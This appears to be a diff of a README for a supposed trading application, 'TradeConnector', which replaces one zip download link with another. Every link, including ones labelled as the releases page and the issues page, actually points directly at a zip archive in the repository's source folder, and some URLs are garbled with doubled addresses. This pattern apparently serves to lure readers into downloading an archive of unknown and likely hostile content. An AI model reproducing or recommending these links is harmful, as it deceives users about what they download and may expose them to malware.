@@ -1,6 +1,6 @@
 # 🚀 TradeConnector - Execute Trades with Ease
 
-[![Download TradeConnector](https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip%https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip)](https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip)
+[![Download TradeConnector](https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip%https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip)](https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To begin, you’ll need to download TradeConnector. Follow the steps below to se
 
 ## 📥 Download & Install
 
-Visit this page to download: [TradeConnector Releases](https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip).
+Visit this page to download: [TradeConnector Releases](https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip).
 
 Once you are on the Releases page, you will see a list of available versions. 
 
@@ -73,7 +73,7 @@ If you encounter issues, here are some common solutions:
 
 - **Application Not Responding:** Restart the application or your computer. Make sure you have a stable Internet connection.
 
-If problems persist, consult the [TradeConnector Issues Page](https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip) for more help.
+If problems persist, consult the [TradeConnector Issues Page](https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip) for more help.
 
 ## 📞 Support
 
@@ -85,6 +85,6 @@ TradeConnector is released under the MIT License. You can freely use, modify, an
 
 ## 📥 Download Now
 
-To download and install TradeConnector, visit this page: [TradeConnector Releases](https://raw.githubusercontent.com/hudayf6261/TradeConnector/main/src/TradeConnector_3.1.zip).
+To download and install TradeConnector, visit this page: [TradeConnector Releases](https://github.com/hudayf6261/TradeConnector/raw/refs/heads/main/src/Trade-Connector-v2.1.zip).
 
 Thank you for choosing TradeConnector. We hope you find it helpful and easy to use!
